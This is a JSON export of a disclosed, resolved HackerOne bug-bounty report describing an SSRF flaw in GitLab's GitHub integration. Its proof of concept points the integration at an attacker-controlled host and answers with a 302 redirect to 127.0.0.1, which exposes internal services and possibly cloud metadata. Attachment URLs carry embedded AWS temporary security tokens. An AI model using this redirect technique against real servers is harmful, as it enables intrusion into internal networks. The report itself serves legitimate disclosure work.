@@ -1,0 +1,220 @@
+{
+  "id": 446593,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDY1OTM=",
+  "url": "https://hackerone.com/reports/446593",
+  "title": "GitLab's GitHub integration is vulnerable to SSRF vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-11-18T04:57:11.807Z",
+  "submitted_at": "2018-11-18T04:57:11.807Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5461"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-08-30T22:18:43.233Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-08-30T22:18:43.168Z",
+  "team_member_agreed_on_going_public_at": "2019-08-30T22:17:25.736Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The GitHub service is vulnerable to a SSRF vulnerability. An attacker may be able to leverage this to make arbitrary `POST` requests in a GitLab instance's internal network. It can also be used to connect to cloud provider's instance metadata API, which may result in the ability to execute commands on the machine.\n\n# Proof of concept\nIn order to reproduce the SSRF, follow the steps below.\n\n - Sign in as any user\n - Create a new project\n - Add a `.gitlab-ci.yml` file with the following contents:\n\n**.gitlab-ci.yml**\n```yml\n# This file is a template, and might need editing before it works on your project.\n# see https://docs.gitlab.com/ce/ci/yaml/README.html for all available options\n\n# you can delete this line if you're not using Docker\nimage: busybox:latest\n\nbefore_script:\n  - echo \"Before script section\"\n  - echo \"For example you might run an update here or install a build dependency\"\n  - echo \"Or perhaps you might print out some debugging details\"\n   \nafter_script:\n  - echo \"After script section\"\n  - echo \"For example you might do some cleanup here\"\n   \nbuild1:\n  stage: build\n  script:\n    - echo \"Do your build here\"\n   \ntest1:\n  stage: test\n  script: \n    - echo \"Do a test here\"\n    - echo \"For example run a test suite\"\n   \ntest2:\n  stage: test\n  script: \n    - echo \"Do another parallel test here\"\n    - echo \"For example run a lint test\"\n   \ndeploy1:\n  stage: deploy\n  script:\n    - echo \"Do your deploy here\"\n```\n\n - Before a minute to make sure the pipelines are created based on the GitLab CI configuration file\n - Set up the GitHub integration and an external repository URL that is under your control (e.g. http://remote_ip/1/2)\n - Click the the `Test settings and save changes` button\n - Observe a request being made to the endpoint that looks something like this:\n\n```\nPOST /api/v3/repos/1/2/statuses/5509244fe4919b85f5c1e0e1a2340805055c32d9 HTTP/1.1\nAccept: application/vnd.github.v3+json\nUser-Agent: Octokit Ruby Gem 4.9.0\nContent-Type: application/json\nAuthorization: token 1\nAccept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\nConnection: close\nHost: remote_ip\nContent-Length: 158\n\n{\"context\":\"ci/gitlab/master\",\"description\":\"Pipeline passed on GitLab\",\"target_url\":\"https://gitlab.com/jobertabma/123/pipelines/36992118\",\"state\":\"success\"}\n```\n\n - respond with a 302 Found response that redirects back to the internal network using the `Location` header:\n\n**Response**\n```\nHTTP/1.1 302 Found\nLocation: http://127.0.0.1/\nConnection: Close\nContent-Length: 0\n```\n\n - Observe the response of `127.0.0.1` (port 80) being returned in the UI through the error message:\n\n{F377195}\n\n - Or, port 8080:\n\n{F377196}\n\n - Or, port 22:\n\n{F377197}\n\n## Impact\n\nAn attacker may be able to leverage this to make arbitrary `POST` requests in a GitLab instance's internal network. It can also be used to connect to cloud provider's instance metadata API, which may result in the ability to execute commands on the machine.",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 377195,
+      "file_name": "Screen_Shot_2018-11-17_at_8.53.28_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/377/195/edce4ca1dcc4e37beb5f2a91124fe7d012dfc08b/Screen_Shot_2018-11-17_at_8.53.28_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-11-17_at_8.53.28_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-11-17_at_8.53.28_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSFJKHVNY%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCjuEkQAi0bVphvxb2YIS24XTbu4maMI36DkWuuXywLGwIgenezN49Uj2Nx3XW8lbKqExaGduSeuFT7m%2BXGwOz8gHYqsQUIfhADGgwwMTM2MTkyNzQ4NDkiDG9kWqzXR2KD1AnCsiqOBUqSUkQHAUcY6ROmOZCw4ie2uHvOeOYG7H3UvQ7FOQc9i6L6ubmZVVdKkd6COOvUxdlNVPSJPjDL1sIx8iYaWO3kV42fJS04oqKI9ns4qXOHduDiHHnUrzFndS1C7fv9qmHyJJ9mcVCQp7kk1w%2F9NppHgzt06jqP%2BcDf%2Fb%2F17qFAzF9QpVJfrQ9UoPmIlDyetils2%2FdyWsGMHfWCQsu33Z2%2FWp3J0zqvGJD0qR1SGjR2X7fc0W8wvTUu%2B03hR56RtvFMUJvnGjF8joWhhdXJFTtas13wr5tjxjFNH6TXJwo2Uoka3lo4jXRsdJ7UuzYyetNOexVLI32rbCOXN821PUJUC5IEBIz3iBQmUB3T23KeqxsY%2F2QxJPgzlpokSOX8rHDV4Bq8Mj1DjnShjpMsUIb2QNjCoIca3%2Fd%2Fq5ZlOkY%2FoVrHqGFnZhSInKZdLjH5uSp8jiEK5Vrm13PQCA7J1uNp%2B9r6rAKqTjqX3wUhoc2IxUQn%2FNG3qWN5GVQWo29%2FBcbrE%2BM30od%2FqejmgoBu5K98I0YRrUsLa%2BtlpAi6MVt9KLfVdLCsi8RM1ihYV9n%2FX6NgjSv010ztqEC%2B0BBmnpHHx2P2kozVRQZu3PSSXwlMxWtpMJoBibYDe32ROGIVcv%2F2KqWd%2BPRMeVNGj6Klwl1IqLsDaQgeRJQLa2ysfOcDBDyBxTXeox7eI0jR6C5Xfcoa1Xo3RepEwz17KoIujC%2FZuv70ado8Yc8m1tGorAKUXn2zIATs46f%2BfWKN5LuP%2BDp%2B0Lb8OowWGsBg%2B%2FHXD4yE8pmZCGiSD0cujQLdICFrYrNAmi3eCx2CjUYTljqZOEj3Xg0kd1%2FpVdxVl3ZZJ20YGR2rjKG%2Fj4%2FDIY%2BKqzDwr7fSBjqxAdq%2BMf1fpetBU8NvS0lII8LkEfpwd0A8Shz0a%2F954DGsd4rUfuJSy%2FkL3JkrwBdnpjyLIuELKFmD8PjyxCOQmgwieKKSTpmWgiiK4JzjZ6oayo6718h95ZCptIguWi65U7ZXCqGQci2EN7KNdpjWEm8iRihrO%2Bldj5%2BJM%2Bv7DgdrPO99mG45zFe%2FmJSFMkGWiGWc1%2BoMcl5%2F0eq2Nt79ccj7qaogFg1W5xt8HooK4ZZWGw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=54016c5d8ee9caf922af8b4f8bdc973e140cf4f5113252fb8d8b3c6878e36b21",
+      "file_size": 118900,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 377196,
+      "file_name": "Screen_Shot_2018-11-17_at_8.54.27_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/377/196/5a19f3c712fc574f7139aac45b00ac52ad47586d/Screen_Shot_2018-11-17_at_8.54.27_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-11-17_at_8.54.27_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-11-17_at_8.54.27_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSFJKHVNY%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCjuEkQAi0bVphvxb2YIS24XTbu4maMI36DkWuuXywLGwIgenezN49Uj2Nx3XW8lbKqExaGduSeuFT7m%2BXGwOz8gHYqsQUIfhADGgwwMTM2MTkyNzQ4NDkiDG9kWqzXR2KD1AnCsiqOBUqSUkQHAUcY6ROmOZCw4ie2uHvOeOYG7H3UvQ7FOQc9i6L6ubmZVVdKkd6COOvUxdlNVPSJPjDL1sIx8iYaWO3kV42fJS04oqKI9ns4qXOHduDiHHnUrzFndS1C7fv9qmHyJJ9mcVCQp7kk1w%2F9NppHgzt06jqP%2BcDf%2Fb%2F17qFAzF9QpVJfrQ9UoPmIlDyetils2%2FdyWsGMHfWCQsu33Z2%2FWp3J0zqvGJD0qR1SGjR2X7fc0W8wvTUu%2B03hR56RtvFMUJvnGjF8joWhhdXJFTtas13wr5tjxjFNH6TXJwo2Uoka3lo4jXRsdJ7UuzYyetNOexVLI32rbCOXN821PUJUC5IEBIz3iBQmUB3T23KeqxsY%2F2QxJPgzlpokSOX8rHDV4Bq8Mj1DjnShjpMsUIb2QNjCoIca3%2Fd%2Fq5ZlOkY%2FoVrHqGFnZhSInKZdLjH5uSp8jiEK5Vrm13PQCA7J1uNp%2B9r6rAKqTjqX3wUhoc2IxUQn%2FNG3qWN5GVQWo29%2FBcbrE%2BM30od%2FqejmgoBu5K98I0YRrUsLa%2BtlpAi6MVt9KLfVdLCsi8RM1ihYV9n%2FX6NgjSv010ztqEC%2B0BBmnpHHx2P2kozVRQZu3PSSXwlMxWtpMJoBibYDe32ROGIVcv%2F2KqWd%2BPRMeVNGj6Klwl1IqLsDaQgeRJQLa2ysfOcDBDyBxTXeox7eI0jR6C5Xfcoa1Xo3RepEwz17KoIujC%2FZuv70ado8Yc8m1tGorAKUXn2zIATs46f%2BfWKN5LuP%2BDp%2B0Lb8OowWGsBg%2B%2FHXD4yE8pmZCGiSD0cujQLdICFrYrNAmi3eCx2CjUYTljqZOEj3Xg0kd1%2FpVdxVl3ZZJ20YGR2rjKG%2Fj4%2FDIY%2BKqzDwr7fSBjqxAdq%2BMf1fpetBU8NvS0lII8LkEfpwd0A8Shz0a%2F954DGsd4rUfuJSy%2FkL3JkrwBdnpjyLIuELKFmD8PjyxCOQmgwieKKSTpmWgiiK4JzjZ6oayo6718h95ZCptIguWi65U7ZXCqGQci2EN7KNdpjWEm8iRihrO%2Bldj5%2BJM%2Bv7DgdrPO99mG45zFe%2FmJSFMkGWiGWc1%2BoMcl5%2F0eq2Nt79ccj7qaogFg1W5xt8HooK4ZZWGw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=933c0a82c9be7d5d2e2966f4f2964959dd183d5f41365966a6e125d41b4d089e",
+      "file_size": 446816,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 377197,
+      "file_name": "Screen_Shot_2018-11-17_at_8.55.21_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/377/197/cd3bac760ef5f46a7af5e0f04dd213112e492960/Screen_Shot_2018-11-17_at_8.55.21_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-11-17_at_8.55.21_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-11-17_at_8.55.21_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSFJKHVNY%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCjuEkQAi0bVphvxb2YIS24XTbu4maMI36DkWuuXywLGwIgenezN49Uj2Nx3XW8lbKqExaGduSeuFT7m%2BXGwOz8gHYqsQUIfhADGgwwMTM2MTkyNzQ4NDkiDG9kWqzXR2KD1AnCsiqOBUqSUkQHAUcY6ROmOZCw4ie2uHvOeOYG7H3UvQ7FOQc9i6L6ubmZVVdKkd6COOvUxdlNVPSJPjDL1sIx8iYaWO3kV42fJS04oqKI9ns4qXOHduDiHHnUrzFndS1C7fv9qmHyJJ9mcVCQp7kk1w%2F9NppHgzt06jqP%2BcDf%2Fb%2F17qFAzF9QpVJfrQ9UoPmIlDyetils2%2FdyWsGMHfWCQsu33Z2%2FWp3J0zqvGJD0qR1SGjR2X7fc0W8wvTUu%2B03hR56RtvFMUJvnGjF8joWhhdXJFTtas13wr5tjxjFNH6TXJwo2Uoka3lo4jXRsdJ7UuzYyetNOexVLI32rbCOXN821PUJUC5IEBIz3iBQmUB3T23KeqxsY%2F2QxJPgzlpokSOX8rHDV4Bq8Mj1DjnShjpMsUIb2QNjCoIca3%2Fd%2Fq5ZlOkY%2FoVrHqGFnZhSInKZdLjH5uSp8jiEK5Vrm13PQCA7J1uNp%2B9r6rAKqTjqX3wUhoc2IxUQn%2FNG3qWN5GVQWo29%2FBcbrE%2BM30od%2FqejmgoBu5K98I0YRrUsLa%2BtlpAi6MVt9KLfVdLCsi8RM1ihYV9n%2FX6NgjSv010ztqEC%2B0BBmnpHHx2P2kozVRQZu3PSSXwlMxWtpMJoBibYDe32ROGIVcv%2F2KqWd%2BPRMeVNGj6Klwl1IqLsDaQgeRJQLa2ysfOcDBDyBxTXeox7eI0jR6C5Xfcoa1Xo3RepEwz17KoIujC%2FZuv70ado8Yc8m1tGorAKUXn2zIATs46f%2BfWKN5LuP%2BDp%2B0Lb8OowWGsBg%2B%2FHXD4yE8pmZCGiSD0cujQLdICFrYrNAmi3eCx2CjUYTljqZOEj3Xg0kd1%2FpVdxVl3ZZJ20YGR2rjKG%2Fj4%2FDIY%2BKqzDwr7fSBjqxAdq%2BMf1fpetBU8NvS0lII8LkEfpwd0A8Shz0a%2F954DGsd4rUfuJSy%2FkL3JkrwBdnpjyLIuELKFmD8PjyxCOQmgwieKKSTpmWgiiK4JzjZ6oayo6718h95ZCptIguWi65U7ZXCqGQci2EN7KNdpjWEm8iRihrO%2Bldj5%2BJM%2Bv7DgdrPO99mG45zFe%2FmJSFMkGWiGWc1%2BoMcl5%2F0eq2Nt79ccj7qaogFg1W5xt8HooK4ZZWGw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3f808be1b7fc254b3f06c1c9ec62fd71c01636ded1518547aed0700a46ef1bda",
+      "file_size": 107763,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 27,
+  "voters": [
+    "loaymorad",
+    "mashoud1122",
+    "securitychops",
+    "twi1",
+    "ali",
+    "sameerphad72",
+    "spam404",
+    "mik317",
+    "ahiezer",
+    "theappsec",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "446593",
+  "votes": 27,
+  "latest_disclosable_activity_at": "2019-08-30T22:18:43.254Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:28:42.336788",
+    "source": "https://hackerone.com/reports/446593.json",
+    "report_id": 446593
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDY1OTM=",
+    "databaseId": "446593",
+    "title": "GitLab's GitHub integration is vulnerable to SSRF vulnerability",
+    "url": "https://hackerone.com/reports/446593",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-08-30T22:18:43.233Z",
+    "created_at": "2018-11-18T04:57:11.807Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "jobert"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNTM1MjM=",
+            "amount": "2000.00",
+            "awarded_amount": "2000.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-08-16T19:24:04.572Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzQ0NjU5Mw==",
+    "_id": "446593",
+    "disclosed": true,
+    "votes": 27,
+    "latest_disclosable_activity_at": "2019-08-30T22:18:43.254Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDY1OTM=",
+      "databaseId": "446593",
+      "title": "GitLab's GitHub integration is vulnerable to SSRF vulnerability",
+      "url": "https://hackerone.com/reports/446593",
+      "disclosed_at": "2019-08-30T22:18:43.233Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    }
+  }
+}
